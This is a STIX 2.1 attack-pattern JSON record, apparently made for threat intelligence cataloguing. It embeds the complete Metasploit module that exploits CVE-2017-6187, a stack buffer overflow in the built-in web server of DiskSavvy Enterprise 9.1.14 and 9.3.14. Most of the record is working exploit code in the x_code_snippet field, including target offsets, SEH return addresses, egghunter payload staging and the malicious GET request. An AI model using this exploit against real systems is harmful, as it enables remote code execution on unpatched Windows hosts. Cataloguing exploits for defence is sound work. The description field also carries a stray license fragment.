{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--66975cb6-9374-4ad7-8912-def4094e3bfc",
    "created": "2024-08-14T16:52:12.426773Z",
    "modified": "2024-08-14T16:52:12.426777Z",
    "name": "DiskSavvy Enterprise GET Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow vulnerability in the web interface of DiskSavvy Enterprise v9.1.14 and v9.3.14 caused by improper bounds checking of the request path in HTTP GET requests sent to the built-in web server. This module has been tested successfully on Windows XP SP3 and Windows 7 SP1.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/disksavvy_get_bof.rb",
            "external_id": "disksavvy_get_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-6187"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Seh\n  include Msf::Exploit::Remote::Egghunter\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'DiskSavvy Enterprise GET Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow vulnerability\n        in the web interface of DiskSavvy Enterprise v9.1.14 and v9.3.14,\n        caused by improper bounds checking of the request path in HTTP GET\n        requests sent to the built-in web server. This module has been\n        tested successfully on Windows XP SP3 and Windows 7 SP1.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'vportal',      # Vulnerability discovery and PoC\n          'Gabor Seljan'  # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2017-6187'],\n          ['EDB', '40869']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'BadChars'   => \"\\x00\\x09\\x0a\\x0d\\x20\",\n          'Space'      => 500\n        },\n      'Targets'        =>\n        [\n          [\n            'Automatic Targeting',\n            {\n              'auto' => true\n            }\n          ],\n          [\n            'DiskSavvy Enterprise v9.1.14',\n            {\n              'Offset' => 542,\n              'Ret'    => 0x101142c0  # POP # POP # RET [libspp.dll]\n            }\n          ],\n          [\n            'DiskSavvy Enterprise v9.3.14',\n            {\n              'Offset' => 2478,\n              'Ret'    => 0x101142ff  # POP # POP # RET [libspp.dll]\n            }\n          ]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2016-12-01',\n      'DefaultTarget'  => 0))\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => '/'\n    )\n\n    if res && res.code == 200\n      version = res.body[/Disk Savvy Enterprise v[^<]*/]\n      if version\n        vprint_status(\"Version detected: #{version}\")\n        if version =~ /9\\.(1|3)\\.14/\n          return Exploit::CheckCode::Appears\n        end\n        return Exploit::CheckCode::Detected\n      end\n    else\n      vprint_error('Unable to determine due to a HTTP connection timeout')\n      return Exploit::CheckCode::Unknown\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    mytarget = target\n\n    if target['auto']\n      mytarget = nil\n\n      print_status('Automatically detecting the target...')\n\n      res = send_request_cgi(\n        'method' => 'GET',\n        'uri'    => '/'\n      )\n\n      if res && res.code == 200\n        if res.body =~ /Disk Savvy Enterprise v9\\.1\\.14/\n          mytarget = targets[1]\n        elsif res.body =~ /Disk Savvy Enterprise v9\\.3\\.14/\n          mytarget = targets[2]\n        end\n      end\n\n      if !mytarget\n        fail_with(Failure::NoTarget, 'No matching target')\n      end\n\n      print_status(\"Selected target: #{mytarget.name}\")\n    end\n\n    eggoptions = {\n      checksum: true,\n      eggtag: rand_text_alpha(4, payload_badchars)\n    }\n\n    hunter, egg = generate_egghunter(\n      payload.encoded,\n      payload_badchars,\n      eggoptions\n    )\n\n    sploit =  make_nops(10)\n    sploit << egg\n    sploit << rand_text_alpha(mytarget['Offset'] - egg.length)\n    sploit << generate_seh_record(mytarget.ret)\n    sploit << make_nops(8)\n    sploit << hunter\n    sploit << rand_text_alpha(4500)\n\n    print_status('Sending malicious request...')\n\n    send_request_cgi(\n      'method' => 'GET',\n      'uri'    => sploit\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-12-01",
    "x_mitre_platforms": [
        "win'"
    ]
}